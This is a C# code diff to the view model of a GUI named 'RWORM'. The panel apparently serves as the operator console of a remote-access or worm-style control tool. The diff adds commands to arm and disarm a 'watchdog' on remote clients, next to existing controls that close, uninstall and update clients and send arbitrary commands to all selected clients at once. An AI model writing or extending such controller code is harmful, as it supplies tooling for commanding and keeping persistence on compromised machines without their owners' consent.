@@ -141,6 +141,8 @@ namespace RWORM.GUI.ViewModels
         public ICommand ClientCloseCommand         { get; }
         public ICommand ClientUninstallCommand     { get; }
         public ICommand ClientUpdateCommand        { get; }
+        public ICommand WatchdogStopCommand        { get; }
+        public ICommand WatchdogStartCommand       { get; }
 
         // Multi-select commands
         public ICommand SendToAllCommand           { get; }
@@ -199,6 +201,8 @@ namespace RWORM.GUI.ViewModels
             ClientCloseCommand        = new RelayCommand(p => ConfirmClose(p as ClientModel));
             ClientUninstallCommand    = new RelayCommand(p => ConfirmUninstall(p as ClientModel));
             ClientUpdateCommand       = new RelayCommand(p => PromptUpdate(p as ClientModel));
+            WatchdogStopCommand       = new RelayCommand(p => ExecuteWatchdogControl(p as ClientModel, false));
+            WatchdogStartCommand      = new RelayCommand(p => ExecuteWatchdogControl(p as ClientModel, true));
             SendToAllCommand          = new RelayCommand(async _ => await ExecuteQuickCommandAsync());
             SendQuickCommand          = new RelayCommand(async _ => await ExecuteQuickCommandAsync());
 
@@ -364,6 +368,20 @@ namespace RWORM.GUI.ViewModels
             if (string.IsNullOrWhiteSpace(cmd)) return;
 
             int count = 0;
+            if (cmd.Equals("watchdog stop", StringComparison.OrdinalIgnoreCase) || cmd.Equals("watchdog off", StringComparison.OrdinalIgnoreCase))
+            {
+                foreach (var c in targets) { _ = _server.WatchdogStop(c.Guid); count++; }
+                QuickCommandText = "";
+                StatusMessage = $"Watchdog Stop sent to {count} client(s)";
+                return;
+            }
+            if (cmd.Equals("watchdog start", StringComparison.OrdinalIgnoreCase) || cmd.Equals("watchdog on", StringComparison.OrdinalIgnoreCase))
+            {
+                foreach (var c in targets) { _ = _server.WatchdogStart(c.Guid); count++; }
+                QuickCommandText = "";
+                StatusMessage = $"Watchdog Start sent to {count} client(s)";
+                return;
+            }
             foreach (var c in targets)
             {
                 _ = _server.SendCommandAsync(c.Guid, cmd);
@@ -470,6 +488,21 @@ namespace RWORM.GUI.ViewModels
             {
                 _ = _server.ClientClose(target.Guid);
             }
+        }
+
+        private void ExecuteWatchdogControl(ClientModel? c, bool start)
+        {
+            var targets = ResolveTargets(c);
+            if (targets.Count == 0) return;
+            string action = start ? "Start/Arm" : "Stop/Disarm";
+            foreach (var target in targets)
+            {
+                if (start)
+                    _ = _server.WatchdogStart(target.Guid);
+                else
+                    _ = _server.WatchdogStop(target.Guid);
+            }
+            StatusMessage = $"Watchdog {action} sent to {targets.Count} client(s)";
         }
 
         private void ConfirmUninstall(ClientModel? c)
